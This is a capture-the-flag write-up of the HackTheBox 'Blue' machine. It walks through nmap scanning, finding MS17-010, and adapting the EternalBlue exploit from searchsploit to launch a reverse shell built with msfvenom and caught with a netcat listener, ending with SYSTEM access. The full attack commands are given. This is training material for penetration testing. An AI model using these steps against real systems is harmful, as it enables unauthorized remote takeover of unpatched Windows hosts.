## Intro

While ultimately not a challenging box - my frustrations were mostly with my own tooling. The python2/python3 split and slow deprecation of python2 has created huge amounts of annoyance. I typically try to rewrite everything I find in python2 into python3 these days, but sometimes that is either a ridiculous amount of work for the task, or you run into weird implementation issues like byte/string concatenation errors. Regardless of how much I dislike having to do it, having a good python2 AND a good python3 environment will just make your life easier, and I inevitably set one up with [pyenv](https://github.com/pyenv/pyenv) during this box engagement.

## Reconnaissance

### Initial Engagement

Typical initial engagement with the box.

```bash
nmap -sC -sV -oA 'scans/initial' 10.129.172.12
```

This will give me a quick overview of the most popular ports, and their potential services on this box. 
- ```-sV``` will probe all open ports to determine service and version info
- ```-sC``` will run default scripts against those services (not the ones flagged as unsafe, however)
- ```-oA``` will output all formats into my scans folder

### Initial Results

```

The box is named Blue, 445 is open, and its Windows 7. Pretty sure I know where this is going.

### More Recon

Despite my suspicions, I still believe in following through with your process, especially if you can do it concurrently.

```bash
nmap -sC -sV -sU -p- -oA 'scans/all-ports' 10.129.172.12
```

**Side Note:** This completed much later in the engagement, with no additional findings of note.


## Enumeration

### Initial Assessments

Port 445 is open, and initial NMAP scanning tells us the hostname is HARIS-PC, its not likely joined to a domain (or hasn't been) and we are running on Windows 7 Professional SP1. Based on the output, it does appear a guest account exists. This is shaking out to be a pretty viable target candidate for something like [Eternal Blue](https://en.wikipedia.org/wiki/EternalBlue).

### SMB

Further SMB vulnerability scanning.

```bash

Nmap done: 1 IP address (1 host up) scanned in 27.87 seconds
```

The scans report the target IS vulnerable to [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) (Hint: EternalBlue/EternalRomance). Given the viability of this exploit, I'm going to stop enumeration here, and proceed with trying to exploit the target via this vector.

## Exploitation

### Initial Assessments

![Searchsploit MS17-010](/assets/img/htb/blue/blue_searchsploit.png)

As suspected, there are several POCs within ```searchsploit```. I am not interested in any Metasploit module; the Windows7/2008 R2 POC in python seems worth pulling down.

```bash
searchsploit -m 42031
mv 42031.py MS17-010.py
```


### Setting Up the Exploit

![Exploit Header](/assets/img/htb/blue/blue_poc_header.png)

Reading the comments and the imports of the code, there is an additional dependency to pull in, ```mysmb.py``` which we will need to do. We modify the username to ***guest***, thanks to NMAP enumerating that for us. ***Note:*** Modified POC code for this specific engagement is hosted on my [GitHub](https://github.com/nullprism/htb-boxes/tree/main/blue).

At this point we need to read what the POC actually does. More often than not, POC (Proof of Concepts) aren't set up for you to just deliver shells to a target, it just simply....a proof of concept. You need to modify them for your intended use. *Usually*,  they are well-documented for something like this. In this particular case, this POC is not particularly well documented. So you have typically have one of two options.

**1)** Read through the code manually to fully understand what is going on so you can modify it to suit your needs.

***OR***

**2)** Run the code against a mock test target in a sandbox target and see what happens.

Honestly - you should be doing both with anything you download off the internet. If this were a live engagements (i.e. not a CTF or HackTheBox) you would ABSOLUTELY be doing both. Never, never, never - blindly throw exploits.

Jumping off my brief soap box, doing #1 of what I just preached about, we find this function.

![def smb pwn](/assets/img/htb/blue/blue_smbpwn.png)

In the case of this POC, the exploit creates a plaintext file in C:\ named ```pwned.txt``` and exits. Cool for testing and proof, but not what we want. We want a shell. A reverse shell. In the above screenshot, I commented out the original POC code, and added in delivery of a shell named ```eternal_blue.exe``` and then the service execution of that shell.

### Building the Payload

As always, ```msfvenom``` is our best friend here.

```bash
┌──(kali㉿kali)-[~/htb/blue/exploits]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.94 LPORT=4443 -f exe > eternal_blue.exe           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

### Setup Listener

Set up our listener to catch the call back.

```bash
nc -lnvp 4443
```

### Launch Exploit (Python Environment Ridiculousness)

With our listener setup, we launch the exploit.

![Exploit Fire](/assets/img/htb/blue/blue_exploit_fire.png)

Seems simple, right? If it fires like this for you, enjoy life; you probably exist in a time in the future where the POC and/or OS has been updated to address things. If you get weird errors about byte and string concatenation, etc - you're probably going to have to set up a python2 environment

There are many ways to approach this, this is just the route I chose. [pyenv](https://github.com/pyenv/pyenv) allows you to have multiple version/instances of python installed on your system and for you to switch between them in the shell context. Once you have pyenv installed (there are plenty of guides on that), install Python 2.7.18, switch to that environment in the shell, install the dependencies for the exploit (likely setuptools and [impacket](https://github.com/SecureAuthCorp/impacket)) and you should be back off to the races.

### Shell

![Blue Shell](/assets/img/htb/blue/blue_shell.png)

Once the exploit fires, our listener receives its call back and we have shell.

## Post-Exploitation

### Initial Assessments

A quick initial orientation tells me that we are **NT AUTHORITY\SYSTEM** and that we are on the intended target host.

## Privilege Escalation

Given our exploit vector, no privilege escalation is necessary on this engagement. We are already "root." We can just go straight for flags.
